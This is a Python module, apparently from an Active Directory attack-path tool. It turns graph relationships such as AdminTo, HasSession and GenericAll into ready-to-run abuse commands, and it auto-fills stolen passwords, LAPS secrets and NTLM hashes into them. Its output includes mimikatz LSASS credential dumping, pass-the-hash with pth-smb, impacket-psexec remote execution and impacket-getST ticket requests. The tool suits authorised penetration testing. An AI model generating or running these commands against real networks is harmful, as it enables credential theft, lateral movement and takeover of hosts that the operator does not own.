from __future__ import annotations

from typing import Any, Dict, List, Tuple
from engine.commands import CommandProvider
from engine import state as est
import logging

log = logging.getLogger("nanohound.commands.ad_standard")


@CommandProvider.register("ad_standard")
def generate(
    source: Dict[str, Any],
    target: Dict[str, Any],
    domain: str | None = None,
    creds: Dict[str, Any] | None = None,
    network_context: Dict[str, Any] | None = None,
) -> List[Tuple[str, str]]:
    """Generate AD-standard abuse command suggestions.

    Provider interface: generate(source, target, domain, creds, network_context)
    Implements guidance for MemberOf, AdminTo, HasSession, AllExtendedRights,
    GenericAll and integrates loot auto-fill and local account filter checks.
    Returns list of (title, command) tuples.
    """
    creds = creds or {}
    oracle = est.command_oracle if hasattr(est, "command_oracle") else None
    lm = est.loot_manager

    src = source or {}
    tgt = target or {}
    edge = creds.get("edge") or creds.get("edge_type") or ""

    title_cmds: List[Tuple[str, str]] = []

    # Legacy monolith removed; rely on modular providers and local heuristics

    # Fallback lightweight suggestions (as before)
    def _build_auth_part(node: Dict[str, Any]) -> str:
        identity = str(node.get("id") or node.get("name") or "")
        # Prefer LAPS/plaintext, then NTLM hash, then password, then kerberos ticket
        flags = ""
        try:
            if lm and hasattr(lm, "build_auth_flags"):
                flags = lm.build_auth_flags(identity)
        except Exception:
            log.debug("build_auth_flags failed for %s", identity)
        return f" {flags}" if flags else ""

    auth_part = _build_auth_part(src)

    # MemberOf: suggest powerview/ldap checks to enumerate group membership and modify if needed
    if edge in ("MemberOf", "MemberOfLocalGroup"):
        title_cmds.append(("Enumerate group membership", f"powershell -c \"Get-ADPrincipalGroupMembership -Identity '{tgt.get('name','<GROUP>')}'\""))
        return title_cmds

    # GenericAll / AllExtendedRights -> privilege escalation guidance
    if edge in ("GenericAll", "AllExtendedRights"):
        # attempt to autofill password/hash if loot exists for source
        cred = None
        if lm:
            cred = lm.get_credential(str(src.get("id") or "")) or lm.get_credential(str(src.get("name") or ""))
        username = src.get("name", "<SOURCE_USER>")
        # Prefer LAPS, then password, then NTLM when embedding
        passwd = (
            (getattr(cred, "laps_password", None) if cred else None)
            or (getattr(cred, "password", None) if cred else None)
            or (getattr(cred, "ntlm_hash", None) if cred else None)
            or "<PASSWORD_OR_HASH>"
        )
        title_cmds.append(("Impacket getST (example)", f"impacket-getST {tgt.get('name','<TARGET>')} -u {username} -p {passwd}{auth_part}"))
        return title_cmds

    # HasSession: suggest mimikatz/sekurlsa or remote token steal guidance
    if edge == "HasSession":
        src_host = src.get("name", "<SOURCE_HOST>")
        title_cmds.append(("Dump LSASS / steal session", f"mimikatz # sekurlsa::logonpasswords /server:{src_host}"))
        return title_cmds

    # AdminTo: admin relationship -> pass-the-hash or psexec style guidance
    if edge == "AdminTo":
        cred = None
        if lm:
            cred = lm.get_credential(str(src.get("id") or "")) or lm.get_credential(str(src.get("name") or ""))
        username = src.get("name", "<SOURCE_USER>")
        ntlm = getattr(cred, "ntlm_hash", None) if cred else None
        laps_pw = getattr(cred, "laps_password", None) if cred else None
        pwd = getattr(cred, "password", None) if cred else None
        if ntlm:
            title_cmds.append(("Pass-the-hash psexec", f"pth-smb {tgt.get('name','<TARGET>')} -u {username} -hash {ntlm}"))
        else:
            # Prefer LAPS/plaintext if available, else stored password
            use_pw = laps_pw or pwd or "<PASSWORD>"
            title_cmds.append(("PSEXEC (example)", f"impacket-psexec {tgt.get('name','<TARGET>')} -u {username} -p {use_pw}{auth_part}"))
        return title_cmds

    # Default: no commands
    return []
